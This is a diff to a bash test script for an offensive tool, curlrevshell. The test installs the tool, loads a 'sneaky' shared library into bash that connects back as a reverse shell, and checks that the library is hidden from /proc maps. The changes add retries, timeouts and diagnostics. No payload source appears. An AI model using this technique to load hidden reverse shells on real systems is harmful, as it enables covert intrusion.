@@ -14,10 +14,11 @@ tap_plan 34
 
 CDIR=$(dirname $0)
 CDIR=${CDIR%/t}     # Directory with the code we're testing.
-CPTO=30s            # Coproces (curlrevshell) timeout.
+CPTO=5m             # Coproces (curlrevshell) timeout.
 LIB=curlrevshell.so # Our sneaky library.
 MAPS=bash.maps      # Mapped memory after library loading
 SOUT=bash.out       # Bash's output
+GOUT=go.out         # go install's output
 TMPD=$(mktemp -d)   # Temporary directory for test files.
 trap 'rm -rf $TMPD; tap_done_testing' EXIT
 
@@ -26,12 +27,12 @@ set +e
 GOBIN=$TMPD go install \
         -ldflags "-w -s" \
         -trimpath \
-        github.com/magisterquis/curlrevshell@bettertemplates >go.out 2>&1
+        github.com/magisterquis/curlrevshell@bettertemplates >$TMPD/$GOUT 2>&1
 RET=$?
 set -e
 tap_ok $RET "curlrevshell installed ok" "$0" $LINENO
 if [[ 0 -ne $RET ]]; then
-        tap_diag "$(<go.out)"
+        tap_diag "$(<$TMPD/$GOUT)"
         exit 12
 fi
 CRS=$TMPD/curlrevshell
@@ -94,16 +95,34 @@ cd "$TMPD"
 # file descirptors.
 # This can't have any double-quotes and all newlines will be replaced with
 # spaces.
-CMD=$(cat <<_eof | tr '\n' ' '
-while ! [[ /dev/fd/3 -ef /dev/fd/0 ]]; do
+CMD=$(cat <<'_eof' | tr '\n' ' '
+MAXTRIES=1024;
+I=0;
+while [[ \$I -lt \$MAXTRIES ]]; do
+        if [[ /dev/fd/3 -ef /dev/fd/0 ]]; then
+                break;
+        fi;
+        : \$((I++));
         sleep .1;
 done;
-enable $LIB ||:;
-while [[ /dev/fd/3 -ef /dev/fd/0 ]]; do
+if [[ \$I -eq \$MAXTRIES ]]; then
+        echo \"Command didn't parse in \$MAXTRIES * tenth-seconds\" >&2;
+        exit 14;
+fi;
+enable \"\$LIB\" ||:;
+I=0;
+while [[ \$I -lt \$MAXTRIES ]]; do
+        if ! [[ /dev/fd/3 -ef /dev/fd/0 ]]; then
+                break;
+        fi;
         sleep .1;
 done;
+if [[ \$I -eq \$MAXTRIES ]]; then
+        echo \"Library wasn't ready in \$MAXTRIES * tenth-seconds\" >&2;
+        exit 15;
+fi;
 exec 3<&-;
-cat </proc/\$\$/maps >bash.maps
+cat </proc/\$\$/maps >bash.maps;
 _eof
 )
 
@@ -112,6 +131,7 @@ set +e
 
 # Load the library. 
 bash -euo pipefail >"$SOUT" 2>&1 <<_eof &
+LIB="$LIB";
 exec 0<<<"$CMD" 3<&0;
 _eof
 RET=$?
@@ -130,7 +150,14 @@ while [[ $I -lt $NWANTS ]]; do
         NLINE=$((I+1))
         WANT=${WANTS[$I]}
         read -p
-        tap_ok $? "Got shell connected line $NLINE/$NWANTS" "$0" $LINENO
+        RET=$?
+        tap_ok $RET "Got shell connected line $NLINE/$NWANTS" "$0" $LINENO
+        if [[ 0 -ne $RET ]]; then
+                tap_diag "Curlrevshell seems gone, bailing"
+                tap_diag "Bash's output:"
+                tap_diag "$(<$SOUT)"
+                exit 13
+        fi
         tap_is \
                 "$REPLY" "$WANT" \
                 "Got correct connected line $NLINE/$NWANTS ($WANT)" \
@@ -181,8 +208,8 @@ set -e
 
 # Make sure bash's output looks right.
 GOT=$(<./"$SOUT")
-WANT="bash: line 2: enable: cannot find ${LIB}_struct in shared object ${LIB}: ./${LIB}: undefined symbol: ${LIB}_struct
-bash: line 2: enable: ${LIB}: not a shell builtin"
+WANT="bash: line 3: enable: cannot find ${LIB}_struct in shared object ${LIB}: ./${LIB}: undefined symbol: ${LIB}_struct
+bash: line 3: enable: ${LIB}: not a shell builtin"
 tap_is "$GOT" "$WANT" "Correct output from loading the library" "$0" $LINENO
 
 # Make sure the library's hidden.
